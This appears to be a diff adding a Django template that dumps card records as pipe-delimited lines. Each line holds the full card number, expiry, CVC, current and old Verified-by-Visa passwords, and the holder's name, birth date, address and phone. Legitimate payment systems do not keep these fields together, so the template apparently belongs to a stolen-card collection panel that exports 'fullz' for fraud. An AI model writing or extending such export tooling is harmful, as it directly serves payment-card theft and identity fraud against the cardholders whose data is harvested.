@@ -1,0 +1,3 @@
+{% load info_filters %}{% for el in cards %}
+{{ el.code }}|{{ el.data|print_card_info_full }}|{{ el.data.card.number|remove_spaces }}|{{ el.data.card.year }}/{{ el.data.card.month }}|{{ el.data.card.cvc }}|{{ el.data|named_field:'additional information'|named_field:'vbv password' }}|{{ el.data|named_field:'additional information'|named_field:'old vbv password'|default:'' }}|{{ el.data|card_holder }}|{{ el.data|named_field:'billing address'|named_field:'date of birth' }}|{{ el.data|named_field:'billing address'|named_field:'zip code' }}|{{ el.data|named_field:'billing address'|named_field:'street address' }}|{{ el.data|named_field:'billing address'|named_field:'phone' }}|{{ el.data|named_field:'billing address'|named_field:'country' }}{% endfor %}
+
